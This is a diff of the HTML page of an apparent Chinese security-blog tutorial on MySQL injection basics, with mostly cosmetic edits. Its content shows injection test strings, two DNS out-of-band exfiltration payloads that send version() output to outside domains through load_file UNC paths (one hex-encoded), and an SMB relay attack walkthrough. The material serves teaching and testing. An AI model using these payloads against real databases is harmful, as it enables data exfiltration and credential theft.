@@ -101,7 +101,7 @@
 
 
 
-  <meta name="keywords" content="KidHat" />
+  <meta name="keywords" content="Mysql," />
 
 
 
@@ -113,19 +113,20 @@
 
 
 <meta name="description" content="原文：MySQL注入攻击与防御在原文章的基础上做了些整理方便自己的知识整理。 测试注入可以用以下语句对一个可能的注入点进行测试    STRING NUMERIC LOGIN     ‘ AND 1 &amp;#39; OR &amp;#39;1   ‘’ AND 0 &amp;#39; OR 1 — –   &amp;quot; AND true &amp;quot; OR &amp;quot;&amp;quot; = &amp;quot;   &amp;quot;">
+<meta name="keywords" content="Mysql">
 <meta property="og:type" content="article">
-<meta property="og:title" content="1.MySql注入(基础)">
-<meta property="og:url" content="https://kidhat.github.io/2017/11/04/1-MySql注入-基础/index.html">
+<meta property="og:title" content="MySql注入(基础)">
+<meta property="og:url" content="https://kidhat.github.io/2017/11/04/MySql注入-基础/index.html">
 <meta property="og:site_name" content="KidHat">
 <meta property="og:description" content="原文：MySQL注入攻击与防御在原文章的基础上做了些整理方便自己的知识整理。 测试注入可以用以下语句对一个可能的注入点进行测试    STRING NUMERIC LOGIN     ‘ AND 1 &amp;#39; OR &amp;#39;1   ‘’ AND 0 &amp;#39; OR 1 — –   &amp;quot; AND true &amp;quot; OR &amp;quot;&amp;quot; = &amp;quot;   &amp;quot;">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="https://kidhat.github.io/2017/11/04/1-MySql注入-基础/dns.png">
-<meta property="og:image" content="https://kidhat.github.io/2017/11/04/1-MySql注入-基础/smb.png">
-<meta property="og:updated_time" content="2017-11-04T05:19:00.599Z">
+<meta property="og:image" content="https://kidhat.github.io/2017/11/04/MySql注入-基础/dns.png">
+<meta property="og:image" content="https://kidhat.github.io/2017/11/04/MySql注入-基础/smb.png">
+<meta property="og:updated_time" content="2017-11-07T02:20:45.409Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="1.MySql注入(基础)">
+<meta name="twitter:title" content="MySql注入(基础)">
 <meta name="twitter:description" content="原文：MySQL注入攻击与防御在原文章的基础上做了些整理方便自己的知识整理。 测试注入可以用以下语句对一个可能的注入点进行测试    STRING NUMERIC LOGIN     ‘ AND 1 &amp;#39; OR &amp;#39;1   ‘’ AND 0 &amp;#39; OR 1 — –   &amp;quot; AND true &amp;quot; OR &amp;quot;&amp;quot; = &amp;quot;   &amp;quot;">
-<meta name="twitter:image" content="https://kidhat.github.io/2017/11/04/1-MySql注入-基础/dns.png">
+<meta name="twitter:image" content="https://kidhat.github.io/2017/11/04/MySql注入-基础/dns.png">
 
 
 
@@ -155,13 +156,13 @@
 
 
 
-  <link rel="canonical" href="https://kidhat.github.io/2017/11/04/1-MySql注入-基础/"/>
+  <link rel="canonical" href="https://kidhat.github.io/2017/11/04/MySql注入-基础/"/>
 
 
 
 
 
-  <title>1.MySql注入(基础) | KidHat</title>
+  <title>MySql注入(基础) | KidHat</title>
   
 
 
@@ -298,7 +299,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://kidhat.github.io/2017/11/04/1-MySql注入-基础/">
+    <link itemprop="mainEntityOfPage" href="https://kidhat.github.io/2017/11/04/MySql注入-基础/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="KidHat">
@@ -315,7 +316,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">1.MySql注入(基础)</h1>
+          <h1 class="post-title" itemprop="name headline">MySql注入(基础)</h1>
         
 
         <div class="post-meta">
@@ -337,6 +338,28 @@
             
           </span>
 
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Web-Security/" itemprop="url" rel="index">
+                    <span itemprop="name">Web-Security</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
           
 
           
@@ -681,10 +704,10 @@
 </tbody>
 </table>
 <p>其中BENCHMARK函数是指执行某函数的次数，次数多时能够达到与sleep函数相同的效果</p>
-<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><h2 id="文件操作权限"><a href="#文件操作权限" class="headerlink" title="文件操作权限"></a>文件操作权限</h2><p>在MySQL中，存在一个称为secure\ <strong>file</strong> __priv的全局系统变量。 该变量用于限制数据的导入和导出操作，例如SELECT … INTO OUTFILE语句和LOAD_FILE（）</p>
+<h1 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h1><h2 id="文件操作权限"><a href="#文件操作权限" class="headerlink" title="文件操作权限"></a>文件操作权限</h2><p>在MySQL中，存在一个称为secure_file_priv的全局系统变量。 该变量用于限制数据的导入和导出操作，例如SELECT … INTO OUTFILE语句和LOAD_FILE（）</p>
 <blockquote>
 <ol>
-<li>如果secure\ <strong>file</strong> __priv变量为空那么直接可以使用函数,如果为null是不能使用</li>
+<li>如果secure_file_priv变量为空那么直接可以使用函数,如果为null是不能使用</li>
 <li>但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了</li>
 </ol>
 </blockquote>
@@ -733,14 +756,14 @@
 <h1 id="带外通道"><a href="#带外通道" class="headerlink" title="带外通道"></a>带外通道</h1><h2 id="什么是带外通道注入？"><a href="#什么是带外通道注入？" class="headerlink" title="什么是带外通道注入？"></a>什么是带外通道注入？</h2><p>带外通道攻击主要是利用其他协议或者渠道从服务器提取数据. 它可能是HTTP（S）请求，DNS解析服务，SMB服务，Mail服务等.</p>
 <h2 id="条件限制"><a href="#条件限制" class="headerlink" title="条件限制"></a>条件限制</h2><ul>
 <li>首先不用多说,这些函数是需要绝对路径的</li>
-<li>如果secure\ <strong>file</strong> __priv变量为空那么直接可以使用函数,如果为null是不能使用</li>
+<li>如果secure_file_priv变量为空那么直接可以使用函数,如果为null是不能使用</li>
 <li>但在mysql的5.5.53之前的版本是默认为空,之后的版本为null,所有是将这个功能禁掉了</li>
 </ul>
 <h2 id="DNS注入"><a href="#DNS注入" class="headerlink" title="DNS注入"></a>DNS注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">select load_file(concat(&apos;\\\\&apos;,version(),&apos;.rootclay.club\\clay.txt&apos;));</div><div class="line">select load_file(concat(0x5c5c5c5c,version(),0x2e6861636b65722e736974655c5c612e747874));</div></pre></td></tr></table></figure>
-<p>上面的语句执行的结果我们可以通过wireshark抓包看一下，过滤一下DNS协议即可清晰看到数据出去的样子，如下图<br><img src="/2017/11/04/1-MySql注入-基础/dns.png" alt=""><br>进行DNS注入需要域名解析，自己有的话最好，但是没有的朋友也没事，这里推荐一个网站 <a href="http://ceye.io/record/index" target="_blank" rel="external">CEYE</a>可以查看数据</p>
+<p>上面的语句执行的结果我们可以通过wireshark抓包看一下，过滤一下DNS协议即可清晰看到数据出去的样子，如下图<br><img src="/2017/11/04/MySql注入-基础/dns.png" alt=""><br>进行DNS注入需要域名解析，自己有的话最好，但是没有的朋友也没事，这里推荐一个网站 <a href="http://ceye.io/record/index" target="_blank" rel="external">CEYE</a>可以查看数据</p>
 <h2 id="SMB-Relay-注入攻击"><a href="#SMB-Relay-注入攻击" class="headerlink" title="SMB Relay 注入攻击"></a>SMB Relay 注入攻击</h2><p><strong>假设有主机B与A</strong><br>(1) A向B发起连接请求<br>(2) B向A发送挑战(一组随机数据，8字节)<br>(3) A用源自明文口令的DESKEY对挑战进行标准DES加密得到响应，并发往B<br>(4) B从SAM中获取A的LM Hash、NTLM Hash，计算出DESKEY，并对前面发往A的挑战进<br>行标准DES加密<br>(5) 如果(4)中计算结果与A送过来的响应匹配，A被允许访问B<br><strong>现在假设一个攻击者C卷入其中</strong><br>(1) C向B发起连接请求<br>(2) B向C发送挑战D(一组随机数据)<br>(3) C等待A向B发起连接请求<br>(4) 当A向B发起连接请求时，C伪造成B向A发送挑战D<br>(5) A用源自明文口令的DESKEY对挑战D进行标准DES加密得到响应E，并发往B<br>(6) C截获到响应E，将它做为针对(2)中挑战D的响应发往B，并声称自己是A<br>(7) B从SAM中获取A的LM Hash、NTLM Hash，计算出DESKEY，并对挑战D进行标准DES<br>加密<br>(8) 如果(7)中计算结果与C送过来的响应匹配，C被允许以A的身份访问B。</p>
 <p>攻击流程</p>
-<p> <img src="/2017/11/04/1-MySql注入-基础/smb.png" alt=""></p>
+<p> <img src="/2017/11/04/MySql注入-基础/smb.png" alt=""></p>
 <p>关于SMB relay攻击窃取NTML与shell请看这篇文章 <a href="http://pen-testing.sans.org/blog/pen-testing/2013/04/25/smb-relay-demystified-and-ntlmv2-pwnage-with-python" target="_blank" rel="external">SMB Relay Demystified and NTLMv2 Pwnage with Python</a></p>
 <p>整理了一下实际操作的步骤如下:</p>
 <ol>
@@ -765,6 +788,12 @@
 
     <footer class="post-footer">
       
+        <div class="post-tags">
+          
+            <a href="/tags/Mysql/" rel="tag"># Mysql</a>
+          
+        </div>
+      
 
       
       
@@ -783,6 +812,10 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2017/11/07/MySql注入-各种绕过姿势/" rel="prev" title="MySql注入-各种绕过姿势">
+                MySql注入-各种绕过姿势 <i class="fa fa-chevron-right"></i>
+              </a>
             
           </div>
         </div>
@@ -863,7 +896,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">2</span>
+                  <span class="site-state-item-count">3</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -885,7 +918,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/tags/index.html">
-                  <span class="site-state-item-count">1</span>
+                  <span class="site-state-item-count">2</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
